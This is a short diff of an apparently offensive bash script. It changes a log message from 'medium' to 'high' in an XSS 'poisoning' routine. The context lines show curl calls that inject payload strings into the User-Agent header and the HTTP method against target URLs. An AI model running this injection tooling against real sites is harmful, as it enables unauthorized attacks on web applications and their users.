@@ -151,7 +151,7 @@ if [ "$ATTACKS" == "XSS" ]; then
                     f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$ln" $line)
                     g=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                 elif [ "$POISON" == "high" ]; then
-                    echo "[*] Poisoning XSS at $line with medium poison"
+                    echo "[*] Poisoning XSS at $line with high poison"
                     z=$(curl -s -H "User-Agent: $ln" $line)
                     e=$(curl -s -H "User-Agent: $ln" -X "$ln" $line)
                     f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$ln" $line)
@@ -177,7 +177,7 @@ if [ "$ATTACKS" == "XSS" ]; then
                 f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$line" $TARGET)
                 g=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
             elif [ "$POISON" == "high" ]; then
-                echo "[*] Poisoning XSS at $TARGET with medium poison"
+                echo "[*] Poisoning XSS at $TARGET with high poison"
                 z=$(curl -s -H "User-Agent: $line" $TARGET)
                 e=$(curl -s -H "User-Agent: $line" -X "$line" $TARGET)
                 f=$(curl -s -H "User-Agent: Mozilla/5.0 (Linux; Android 9; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36" -X "$line" $TARGET)
